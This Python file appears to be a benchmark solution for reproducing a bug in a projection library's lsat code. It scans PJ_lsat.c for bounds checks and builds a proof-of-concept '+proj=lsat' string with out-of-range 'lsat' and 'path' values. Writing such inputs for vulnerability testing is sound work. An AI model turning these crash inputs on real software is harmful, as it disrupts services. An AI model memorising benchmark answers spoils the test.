import os
import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        lsat_value = None
        path_value = None

        try:
            with tarfile.open(src_path, 'r:*') as tf:
                lsat_source = None
                for m in tf.getmembers():
                    if os.path.basename(m.name) == 'PJ_lsat.c':
                        f = tf.extractfile(m)
                        if f is not None:
                            try:
                                lsat_source = f.read().decode('latin1', 'ignore')
                            finally:
                                f.close()
                        break

            if lsat_source:

                def choose_value(var: str) -> int:
                    # Find simple integer comparisons involving this variable
                    pattern1 = re.compile(
                        rf'\b{var}\b\s*(<=|>=|<|>|==|!=)\s*(-?\d+)',
                        re.MULTILINE,
                    )
                    pattern2 = re.compile(
                        rf'(-?\d+)\s*(<=|>=|<|>|==|!=)\s*\b{var}\b',
                        re.MULTILINE,
                    )

                    lt_consts = []  # constants where var < const or var <= const
                    gt_consts = []  # constants where var > const or var >= const
                    eq_consts = []  # constants where var == const or var != const

                    for op, num in pattern1.findall(lsat_source):
                        c = int(num)
                        if op in ('<', '<='):
                            lt_consts.append(c)
                        elif op in ('>', '>='):
                            gt_consts.append(c)
                        else:  # == or !=
                            eq_consts.append(c)

                    for num, op in pattern2.findall(lsat_source):
                        c = int(num)
                        # const < var  => var > const
                        # const <= var => var >= const
                        # const > var  => var < const
                        # const >= var => var <= const
                        if op in ('<', '<='):
                            gt_consts.append(c)
                        elif op in ('>', '>='):
                            lt_consts.append(c)
                        else:  # == or !=
                            eq_consts.append(c)

                    # Default clearly-invalid value for typically-positive params
                    v = -1

                    if lt_consts:
                        # Pick a value smaller than the smallest upper bound
                        v = min(lt_consts) - 1
                    elif gt_consts:
                        # Pick a value greater than the largest lower bound
                        v = max(gt_consts) + 1
                    elif eq_consts:
                        # Fallback: match one equality constant (hope it's an error trigger)
                        v = eq_consts[0]

                    return v

                lsat_value = choose_value('lsat')
                path_value = choose_value('path')

        except Exception:
            # Any analysis failure: fall back to generic invalid values
            pass

        if lsat_value is None:
            lsat_value = -1
        if path_value is None:
            path_value = -1

        poc_str = f"+proj=lsat +lsat={lsat_value} +path={path_value}\n"
        return poc_str.encode('ascii', 'ignore')
